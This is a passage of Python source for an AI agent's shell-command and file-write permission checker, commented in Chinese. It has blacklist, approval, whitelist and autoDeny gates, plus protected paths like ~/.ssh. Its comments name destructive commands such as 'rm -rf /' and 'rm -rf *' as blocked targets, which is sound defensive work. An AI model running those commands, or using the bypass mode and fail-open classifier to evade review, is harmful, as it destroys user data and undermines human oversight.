    这类检查要防的）。复合命令逐段检查。返回拒绝原因，未命中返回 None。
    """
    if not command:
        return None
    base_dir = cwd or os.getcwd()
    for seg in _CMD_SEGMENT_SPLIT_RE.split(command):
        toks = seg.split()
        if not toks:
            continue
        verb = toks[0].replace("\\", "/").split("/")[-1].lower()
        if verb not in _REMOVAL_VERBS:
            continue
        for tok in toks[1:]:
            if _CMD_FLAG_RE.match(tok):
                continue
            t = tok.strip("'\"")
            if not t:
                continue
            if t == "*":
                return f"危险删除目标（通配符 *）: {seg.strip()}"
            try:
                p = Path(t).expanduser()
                resolved = p if p.is_absolute() else (Path(base_dir) / p)
                rp = str(Path(str(resolved)).resolve())
            except (OSError, ValueError, RuntimeError):
                continue  # 解析失败的 token 交给其他闸门
            if is_dangerous_removal_path(rp):
                return f"危险删除目标: {rp}"
    return None


# ---------------------------------------------------------------------------
# 完整命令权限检查器（带审批缓存）
# ---------------------------------------------------------------------------

class PermissionChecker:
    """命令执行权限检查器。

    四道闸门：
      1. 硬拒绝（黑名单）
      2. 破坏性命令（rm/del 等）需用户审批
      3. 用户审批（callback + 会话内缓存）
      4. aux_llm 分类（feature flag 门控，默认 OFF）

    持久化白名单：用户批准过的破坏性命令存 JSON，跨会话不再询问。
    会话内缓存：本次会话批准过的命令不重复问（_approved）。
    """

    def __init__(
        self,
        approval_callback: Optional[Callable[[str], bool]] = None,
        whitelist_file=None,
        paths_whitelist_file=None,
        mode: str = "default",  # "default" | "bypassPermissions" | "acceptEdits" | "autoDeny"
        hooks_registry=None,  # round3 D2 NEW: 权限审计 hook
    ):
        """
        参数：
            approval_callback: fn(command: str) -> bool，破坏性命令 / 路径审批。
                              callback 内部可根据字符串内容判断是命令还是路径
                              （含 / 或 \\ 或 ~ 开头 → 路径）。
            whitelist_file: 持久化白名单 JSON 路径（如 ~/.OmniMate/approved_commands.json）。
            paths_whitelist_file: 路径白名单 JSON（如 ~/.OmniMate/approved_paths.json）。
                                  用户批准过的写入路径，跨会话不再询问。
            mode: 权限模式。
                  - "default": 四道闸门全开（黑名单 + 破坏性审批 + 默认通过 + 可选 LLM）。
                  - "bypassPermissions": 跳过闸门 1/2/3/4,直接放行所有命令;
                    但仍保留闸门 0(自我保护 + fatal 硬底线)。
                    用于 Claude Code 兼容的 --dangerously-skip-permissions 场景。
                  - "acceptEdits": cwd 内 safe-fs（mkdir/touch/mv/cp/rm/del）命令和
                    cwd 内写入自动放行，其他命令走原闸门（fatal 底线 + 自我保护 +
                    受保护路径仍生效）。适合 agent 连续编辑代码场景。
                  - "autoDeny" (Task J): 所有需用户审批的命令直接拒（fail-closed）。
                    用于 async 子代理（background=True）：用户不在场无法审批，
                    借鉴 Claude Code `shouldAvoidPermissionPrompts: true`。
                    保留 fatal 底线 + 黑名单 + 受保护路径（所有硬拒仍生效）；
                    已批准命令（白名单缓存）仍可执行；
                    其他破坏性命令（rm 等）一律 permission_denied。
            hooks_registry: 可选的 HookRegistry，用于触发 PERMISSION_REQUEST /
                           PERMISSION_DENIED 审计事件。fail-open：hook 异常不影响权限判断。
        """
        self.approval_callback = approval_callback
        self._approved = set()  # 会话内缓存（命令）
        # CCAR14 Task 3: 会话级写入根目录审批缓存（check_path 闸门 3 白名单外，
        # 用户批准一次后父目录进缓存，同目录后续写入不再询问）
        self._approved_write_roots: set = set()
        self._whitelist_file = whitelist_file
        self._persistent_whitelist = set()
        if whitelist_file:
            self._load_whitelist()
        # 路径白名单（write_file 等场景，用户批准过的写入路径）
        self._paths_whitelist_file = paths_whitelist_file
        self._approved_paths = set()
        if paths_whitelist_file:
            self._load_paths_whitelist()
        # 权限模式（default / bypassPermissions / acceptEdits / autoDeny）
        if mode not in ("default", "bypassPermissions", "acceptEdits", "autoDeny"):
            raise ValueError(f"非法 permission_mode: {mode}")
        self.mode = mode
        # round3 D2 NEW: hooks registry 引用（可选，None=不触发审计 hook）
        self._hooks_registry = hooks_registry
        # OS 沙箱模式（off | on）；运行时通过 set_sandbox_mode() 切换
        # 实际 wrapper 注入由 terminal_tool 负责（基于本字段的值决定走哪条路径）
        self.sandbox_mode = "off"
        # === P4.1 NEW: 闸门 4 注入点（aux_llm + config）===
        # PermissionChecker 在 cli.py 比 aux_llm_router 先构造，所以用 provider
        # 延迟注入（参考 hook_exec 的 _AUX_ROUTER_PROVIDER 同款 pattern）。
        # 默认 None：闸门 4 完全跳过（向后兼容，默认 OFF）。
        self._aux_llm_provider: Optional[Callable[[], Any]] = None
        self._config_provider: Optional[Callable[[], Dict[str, Any]]] = None

    def set_aux_llm_provider(self, provider: Callable[[], Any]) -> None:
        """注入 aux_llm_router provider（cli.py 在创建 aux_llm_router 后调）。

        provider 是个 callable，返回 AuxLLMRouter 实例或 None。
        用 provider 而不是直接传 router，是因为 PermissionChecker 比 aux_llm_router
        先构造（参考 hook_exec.set_aux_router_provider 同款 pattern）。
        """
        self._aux_llm_provider = provider

    def set_config_provider(self, provider: Callable[[], Dict[str, Any]]) -> None:
        """注入 config provider（cli.py 在 RuntimeContext 构造完后调）。

        provider 是个 callable，返回 config dict 或 None。
        闸门 4 需要读 config.features.bash_llm_classifier 判断开关 + 白名单。
        """
        self._config_provider = provider

    def _readonly_fastpath_enabled(self) -> bool:
        """T7：只读快速通道开关（config security.readonly_fastpath_enabled，默认 True）。"""
        if self._config_provider is None:
            return True
        try:
            config = self._config_provider() or {}
            sec = config.get("security") or {}
            return bool(sec.get("readonly_fastpath_enabled", True))
        except Exception:
            return True  # fail-open：读不到配置默认开

    def _deny(self, command: str, reason: str, deny_type: str = "deny") -> "PermissionResult":
        """round3 D2 NEW: 统一 deny helper。

        触发 PERMISSION_DENIED 审计 hook（fail-open）后返回 PermissionResult(False)。
        所有 check() 的拒绝路径都走这个 helper，保证审计事件不遗漏。
        """
        if self._hooks_registry is not None:
            try:
                self._hooks_registry.run_permission_denied({
                    "command": command,
                    "reason": reason,
                    "deny_type": deny_type,
                })
            except Exception:
                pass  # fail-open：hook 异常不影响权限判断
        return PermissionResult(False, reason, deny_type)

    def _load_whitelist(self):
        """加载持久化白名单。"""
        if not self._whitelist_file:
            return
        try:
            path = Path(self._whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._persistent_whitelist = set(data.get("commands", []))
                logger.info("加载 %d 条已批准命令", len(self._persistent_whitelist))
        except Exception as e:
            logger.debug("加载白名单失败: %s", e)

    def _save_whitelist(self):
        """保存持久化白名单（原子写）。"""
        if not self._whitelist_file:
            return
        try:
            path = Path(self._whitelist_file)
            atomic_write_text(
                path,
                json.dumps(
                    {"commands": sorted(self._persistent_whitelist)},
                    ensure_ascii=False,
                    indent=2,
                ),
            )
        except Exception as e:
            logger.debug("保存白名单失败: %s", e)

    def _load_paths_whitelist(self):
        """加载路径白名单。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._approved_paths = set(data.get("paths", []))
                logger.info("加载 %d 条已批准写入路径", len(self._approved_paths))
        except Exception as e:
            logger.debug("加载路径白名单失败: %s", e)

    def _save_paths_whitelist(self):
        """保存路径白名单（原子写）。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            atomic_write_text(
                path,
                json.dumps(
                    {"paths": sorted(self._approved_paths)},
                    ensure_ascii=False,
                    indent=2,
                ),
            )
        except Exception as e:
            logger.debug("保存路径白名单失败: %s", e)

    def check(
        self,
        command: str,
        cwd: Optional[str] = None,
        *,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查命令是否允许执行。

        参数：
            mode_override: 可选的 mode 覆盖（"default" / "bypassPermissions"）。
                          优先于 self.mode，用于子代理按 agent_ref.permission_mode
                          做决策，而不污染全局 checker 状态（线程安全）。
        """
        # 决定本次 check 使用的 effective mode（override 优先）
        effective_mode = mode_override or self.mode

        # 闸门 0:不可绕过的底线（自我保护 + 系统级 fatal）
        # 这两道检查在任何 mode（包括 bypassPermissions）下都执行
        self_violation = check_self_modification(command, cwd)
        if self_violation:
            return self._deny(command, f"自我保护: {self_violation}", "deny")
        fatal = check_fatal_irreversible(command)
        if fatal:
            return self._deny(command, f"硬底线: {fatal}", "deny")

        # bypassPermissions 模式:跳过闸门 1/2/3,直接放行剩余所有命令
        # 适用场景:Claude Code 兼容的 --dangerously-skip-permissions,
        # 用户已明确接受风险,不需要审批。闸门 0 的两道底线仍生效。
        if effective_mode == "bypassPermissions":
            return PermissionResult(True, "bypassPermissions 模式放行", "bypass")

        # === R16 #6：危险删除路径（任何非 bypass 模式默认拒，不可审批解锁）===
        # rm/del 目标为 * / 根 / 家 / 根直接子目录 / 盘根(直接子目录) → 拒。
        # 必须在 acceptEdits 之前：rm 在 SAFE_FS 动词表里，否则 "rm -rf *" 会
        # 被 cwd 内 safe-fs 自动放行。
        dangerous_rm = check_dangerous_removal(command, cwd)
        if dangerous_rm:
            return self._deny(command, f"危险删除: {dangerous_rm}", "deny")

        # acceptEdits: safe-fs 命令在 cwd 内自动放行；其他命令走原闸门
        if effective_mode == "acceptEdits" and _is_safe_fs_in_cwd(command, cwd):
            return PermissionResult(True, "acceptEdits: safe-fs in cwd", "auto")

        # 闸门 1：硬拒绝
        deny = check_command_deny(command)
        if deny:
            return self._deny(command, f"硬拒绝: {deny}", "deny")

        # === T7：只读快速通道（自动批，在破坏性审批与 LLM 分类器之前）===
        # git status/ls/cat 等只读命令零打扰放行（也跳过闸门 4 的 LLM 调用）。
        # 顺序在闸门 1 之后：黑名单永远先于快速通道（fatal 底线更早在闸门 0）。
        # config security.readonly_fastpath_enabled=False 可关（默认 True）。
        if self._readonly_fastpath_enabled():
            if _is_readonly_command(command):
                return PermissionResult(True, "只读快速通道（readonly fastpath）", "auto")

        # 闸门 2：破坏性命令（需要审批）
        destructive = check_destructive(command)
        if destructive:
            cmd_key = command.strip()

            # 先检查持久化白名单 + 会话缓存
            if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
                return PermissionResult(True, "已批准（白名单）", "approval")

            # === Task J NEW: auto_deny 短路 ===
            # async 子代理（background=True）不能弹审批 UI（用户不在场），
            # 所有需 user approval 的破坏性命令直接 permission_denied（fail-closed）。
            # 借鉴 Claude Code `shouldAvoidPermissionPrompts: true`。
            # 注意：
            # - fatal 底线（rm -rf / 等）已在闸门 0 拒绝，不会走到这里
            # - 黑名单（sudo 等）已在闸门 1 拒绝，不会走到这里
            # - 已批准命令（白名单缓存）已在上面的 if 放行
            # - safe-fs 在 cwd 内（acceptEdits 模式）已在上面 acceptEdits 分支放行，
            #   auto_deny 模式不走 acceptEdits，safe-fs 路径不触发
            #
            # Task J review fix：必须用 effective_mode（来自 mode_override 或 self.mode），
            # 不能用 self.auto_deny 实例字段——singleton checker（get_default_checker()
            # 返回的共享实例）的 self.mode 永远是 "default"，子代理的 autoDeny 通过
            # mode_override 传入，只有 effective_mode 能反映本次调用的真实模式。
            if effective_mode == "autoDeny":
                return self._deny(
                    command,
                    f"auto-denied: async 子代理不能弹审批 UI（破坏性命令: {destructive}）",
                    "auto_deny",
                )

            if self.approval_callback is None:
                return self._deny(
                    command,
                    f"破坏性命令需用户确认: {destructive}",
                    "destructive",
                )

            # round3 D2 NEW: PERMISSION_REQUEST 审计（进入用户审批前）
            if self._hooks_registry is not None:
                try:
                    self._hooks_registry.run_permission_request({
                        "command": command,
                        "reason": destructive,
                    })
                except Exception:
                    pass  # fail-open

            # CCAR11 Task 6 NEW: 桌面通知——用户可能没盯屏幕，弹 toast 提醒审批
            # fail-open：notify 异常不影响审批流程
            try:
                from agent.notifier import notify as _notify
                _notify("需要审批", "agent 请求执行命令")
            except Exception:
                pass

            try:
                approved = bool(self.approval_callback(command))
            except Exception:
                approved = False

            if not approved:
                return self._deny(command, "用户拒绝", "approval")

            # 批准：加入会话缓存 + 持久化白名单
            self._approved.add(cmd_key)
            self._persistent_whitelist.add(cmd_key)
            self._save_whitelist()
            return PermissionResult(True, "已批准", "approval")

        # 闸门 4：aux_llm 分类（feature flag 门控，默认 OFF）
        # 前三道闸门都没拒绝也没要求审批的命令（非黑名单、非破坏性），
        # 由 aux_llm 再做一次语义判断。白名单快速通道跳过 LLM 调用。
        # fail-open：feature 关闭 / 未注入 provider / LLM 调用失败 → 放行。
        result = self._check_llm_classifier(command)
        if result is not None:
            return result

        # 闸门 3：默认通过
        return PermissionResult(True, "ok", "ok")

    def _check_llm_classifier(self, command: str) -> Optional[PermissionResult]:
        """闸门 4 实现：调 aux_llm 分类命令。

        Returns:
            PermissionResult：放行 / 拒绝
            None：闸门 4 未启用或 fail-open 放行交给闸门 3 处理（向后兼容）
        """
        # 1) 检查 provider 是否注入（默认 None → 跳过）
        if self._config_provider is None or self._aux_llm_provider is None:
            return None

        # 2) 读 config + feature flag
        try:
            config = self._config_provider() or {}
        except Exception as e:
            logger.warning("bash_llm_classifier: config provider 异常（跳过）: %s", e)
            return None

        try:
            from agent.feature_flags import is_feature_enabled, get_feature_config
        except ImportError:
            return None

        if not is_feature_enabled(config, "bash_llm_classifier"):
            return None  # feature 关闭 → 跳过

        # 3) 白名单快速通道（0 LLM 调用）
        cfg = get_feature_config(config, "bash_llm_classifier")
        whitelist = cfg.get("whitelist", [])
        if _matches_whitelist(command, whitelist):
            return PermissionResult(True, "白名单快速通道", "whitelist")

        # 4) 调 aux_llm 分类（async → sync 用 asyncio.run 桥接）
        try:
            aux_llm = self._aux_llm_provider()
        except Exception as e:
            logger.warning("bash_llm_classifier: aux_llm provider 异常（fail-open）: %s", e)
            return None  # fail-open：交给闸门 3 放行

        if aux_llm is None:
            # provider 返回 None（aux_llm 未配置）→ fail-open
            return None

        try:
            verdict = asyncio.run(_classify_bash_command(command, aux_llm))
        except RuntimeError as e:
            # asyncio.run 在已有事件循环的上下文里会抛 RuntimeError。
            # PermissionChecker.check 通常在工具执行线程（无事件循环），但保险起见处理。
            logger.warning("bash_llm_classifier: asyncio.run 失败（fail-open）: %s", e)
            return None
        except Exception as e:
            logger.warning("bash_llm_classifier: 分类调用异常（fail-open）: %s", e)
            return None

        # 调用失败 → fail-open 放行（交给闸门 3）
        if "error" in verdict:
            return None

        if verdict.get("safe", True):
            return PermissionResult(True, "aux_llm 判安全", "llm_safe")

        # AI 判 unsafe → 拒绝 + 原因
        reason = verdict.get("reason", "AI 判定不安全")
        return self._deny(
            command,
            f"AI 分类拒绝: {reason}",
            "llm_unsafe",
        )

    def check_path(
        self,
        path,
        *,
        write: bool = False,
        allowed_roots: Optional[List] = None,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查文件路径是否可访问。

        规则:
        - 读:受保护路径(~/.ssh 等)拒,其他允许
        - 写:
          闸门 1:受保护路径(~/.ssh / /etc / C:\\Windows 等)→ 硬拒(安全底线)
          闸门 2:写保护路径(项目代码目录)→ 硬拒(防入侵)
          闸门 3:写白名单(workspace cwd / ~/.OmniMate / /add-dir 追加的
                 extra roots)之内放行;之外走审批通道(CCAR14 Task 3):
                 会话缓存命中放行 → autoDeny 直接拒 → approval_callback
                 审批(批准后父目录进会话缓存) → 无 callback 拒。

        CCAR13 Task 4: 恢复闸门 3 的白名单语义（dcec556b 曾放开为"其他全通过"，
        导致 /add-dir 加的额外白名单对 write_file/str_replace 不生效——它们走
        check_path 而非 safe_path）。白名单经 default_allowed_roots() 统一取：
        workspace cwd + ~/.OmniMate + _EXTRA_ALLOWED_ROOTS，与 safe_path 同源。
        顺序铁律：闸门 1/2 在前——白名单加 home 根也写不了 ~/.ssh。

        参数：
            mode_override: 可选的 mode 覆盖。bypassPermissions 时跳过写保护（项目代码）
                          之外的写约束（仍受 is_protected_path 硬底线限制）。
        """
        # 决定本次 check_path 使用的 effective mode
        effective_mode = mode_override or self.mode

        # R16 #2:可疑路径形态前置检查（读写都查、任何模式都拒——安全底线，
        # 防止 NTFS ADS / 8.3 短名 / 尾点等形态绕过下面的保护表与白名单）
        susp = check_suspicious_path(path, write=write)
        if susp:
            return self._deny(str(path), f"可疑路径形态: {susp}", "suspicious")

        # 闸门 1:受保护路径硬拒（任何模式下都拒——安全底线）
        prot = is_protected_path(path)
        if prot:
            return self._deny(str(path), f"受保护路径: {prot}", "protected")

        if not write:
            return PermissionResult(True, "ok", "ok")

        # 闸门 2:写保护路径(项目代码目录)→ 拒
        # bypassPermissions 模式下也保留此检查（防 agent 改自身代码）。
        # CCAR14 Task 1: 此块从 acceptEdits 分支之后上移到之前——闸门 2 是
        # 全模式硬底线，acceptEdits 不能绕过（否则 cwd 即 agent repo 时
        # "cwd 内自动放行" 会连自身源码一起批）。
        wprot = is_write_protected_path(path)
        if wprot:
            return self._deny(str(path), f"写保护(项目代码): {wprot}", "protected")

        # acceptEdits: cwd 内写入自动放行
        # 受保护路径已在闸门 1 拒掉、写保护已在闸门 2 拒掉，
        # 此处只处理 cwd 内合法写入。
        if effective_mode == "acceptEdits":
            from agent.workspace_context import get_workspace_cwd
            try:
                cwd_path = Path(get_workspace_cwd()).resolve()
                resolved = Path(path).expanduser().resolve()
                resolved.relative_to(cwd_path)
                return PermissionResult(True, "acceptEdits: write in cwd", "auto")
            except (ValueError, OSError, RuntimeError):
                pass  # cwd 外 → 继续走下面的白名单检查

        # 闸门 3（CCAR13 Task 4）:写白名单。
        # bypassPermissions 跳过白名单（闸门 1/2 硬底线已在上面守住，
        # 对齐 test_write_file_respects_agent_ref_bypass_mode 的既有语义）。
        if effective_mode == "bypassPermissions":
            return PermissionResult(True, "ok", "ok")

        # 白名单与 safe_path 同源：workspace cwd + ~/.OmniMate + extra roots。
        # 调用方显式传 allowed_roots 时以其为准（覆盖默认）。
        if allowed_roots is None:
            allowed_roots = default_allowed_roots()
        roots = [Path(p).expanduser().resolve() for p in allowed_roots]

        try:
            resolved = Path(path).expanduser().resolve()
        except (OSError, ValueError) as e:
            return self._deny(str(path), f"路径解析失败: {e}", "protected")

        for root in roots:
            try:
                resolved.relative_to(root)
                return PermissionResult(True, "白名单内", "ok")
            except (OSError, ValueError):
                continue

        # === CCAR14 Task 3: 闸门 3 审批通道（白名单外、最终 deny 之前）===
        # 与 terminal 命令审批同构：会话缓存 → autoDeny 短路 → callback 审批。
        # 注意：闸门 1/2（受保护/写保护）在上面已硬拒，不会进这里——
        # 追加白名单/审批缓存都不能绕过硬底线（安全默认 > 事后补救）。

        # 3.1 会话缓存命中：目标路径在已批准的写入根目录下 → 放行
        # （relative_to 对相等路径也成立，目录本身命中同样放行）
        # 迭代副本：主线程审批 .add() 与 async 子代理 daemon 线程并发迭代
        # 会抛 "Set changed size during iteration"（final review Minor）
        for approved_root in tuple(self._approved_write_roots):
            try:
                resolved.relative_to(approved_root)
                return PermissionResult(True, "已批准（写入根目录）", "approval")
            except (OSError, ValueError):
                continue

        # 3.2 autoDeny：async 子代理（用户不在场）不能弹审批 UI → 直接拒
        # （对齐 terminal 闸门 3 的 autoDeny 短路语义，fail-closed）
        if effective_mode == "autoDeny":
            return self._deny(
                str(path),
                f"auto-denied: async 子代理不能弹审批 UI（白名单外写入: {resolved}）",
                "auto_deny",
            )

        # 3.3 default / acceptEdits（cwd 外落到这里）：有 callback → 问用户
        # callback 签名 fn(item: str) -> bool（与 terminal 共用同一接口），
        # 类型区分靠消息文本前缀"文件写入审批"（cli.py 的 callback 按内容
        # 含路径分隔符启发式识别路径分支）。
        if self.approval_callback is not None:
            # Task 3 fix: PERMISSION_REQUEST 审计 + toast（与 terminal 审批点同构）
            # fail-open：hook / notify 异常不影响审批流程
            if self._hooks_registry is not None:
                try:
                    self._hooks_registry.run_permission_request({
                        "command": f"文件写入审批: {resolved}",
                        "reason": f"写入路径不在白名单: {resolved}",
                    })
                except Exception:
                    pass  # fail-open

            try:
                from agent.notifier import notify as _notify
                _notify("需要审批", "agent 请求写入白名单外路径（可选总是允许）")
            except Exception:
                pass

            try:
                decision = self.approval_callback(f"文件写入审批: {resolved}")
            except Exception:
                decision = False  # fail-open：callback 异常按拒绝处理（不崩）

            # T5（核心机制对齐第 5 项）："总是允许"档——持久化到 settings.json。
            # 协议向后兼容：返回 True 视为"本次允许"（仅会话缓存，现状语义）。
            if decision == "always":
                parent = resolved.parent
                # 会话缓存 + 运行时白名单（本进程内立即生效，含其他 checker 实例）
                self._approved_write_roots.add(parent)
                try:
                    add_extra_allowed_root(parent)
                except Exception:
                    pass
                # 持久化：settings.json security.extra_allowed_roots（与 /add-dir 同通道）
                persisted = False
                try:
                    from agent.settings import persist_extra_allowed_root
                    persisted = persist_extra_allowed_root(str(parent))
                except Exception as e:
                    logger.warning("写入根目录持久化失败（会话内仍有效）: %s", e)
                reason = (
                    "已批准（总是允许，已持久化）" if persisted
                    else "已批准（总是允许，持久化失败仅会话内有效）"
                )
                return PermissionResult(True, reason, "approval")

            approved = bool(decision)
            if approved:
                # 批准：父目录进会话缓存，同目录后续写入不再询问
                self._approved_write_roots.add(resolved.parent)
                return PermissionResult(True, "已批准（写入根目录）", "approval")
            return self._deny(str(path), "用户拒绝", "approval")

        # 3.4 无 callback → 拒（现状，消息含允许根）
        return self._deny(
            str(path),
            f"写入路径不在白名单: {resolved}（允许: {[str(r) for r in roots]}）",
            "protected",
        )

    def add_to_whitelist(self, command: str):
        """手动加入持久化白名单。"""
        self._persistent_whitelist.add(command.strip())
        self._save_whitelist()

    def remove_from_whitelist(self, command: str) -> bool:
        """从持久化白名单移除。返回是否找到并移除。"""
        before = len(self._persistent_whitelist)
        self._persistent_whitelist.discard(command.strip())
        if len(self._persistent_whitelist) < before:
            self._save_whitelist()
            return True
        return False

    def list_whitelist(self) -> list:
        """列出持久化白名单（排序）。"""
        return sorted(self._persistent_whitelist)

    def reset_cache(self):
        """清空会话内缓存（不影响持久化白名单）。"""
        self._approved.clear()
        # CCAR14 Task 3: 写入根目录审批缓存同样是会话级，一并清空
        self._approved_write_roots.clear()

    def set_sandbox_mode(self, mode: str) -> None:
        """切换 OS 沙箱模式（/sandbox 命令调）。

        参数：
            mode: "off" 关闭（默认）或 "on" 开启。
                  on 时 terminal_tool 会把命令包进 bwrap/seatbelt wrapper。
                  不可用时走 fail-open 降级（警告 + 原路径）。

        异常：
            ValueError: mode 不在 ("off", "on") 中。
        """
        if mode not in ("off", "on"):
            raise ValueError(f"非法 sandbox_mode: {mode}（仅支持 off / on）")
        self.sandbox_mode = mode


# 全局默认 checker（无审批，只走闸门 1/2）
_default_checker = PermissionChecker()


def get_default_checker() -> PermissionChecker:
    return _default_checker


def set_default_checker(checker: PermissionChecker) -> None:
    """设置全局默认 checker（CLI 启动时调用，注入审批 callback）。"""
    global _default_checker
    _default_checker = checker
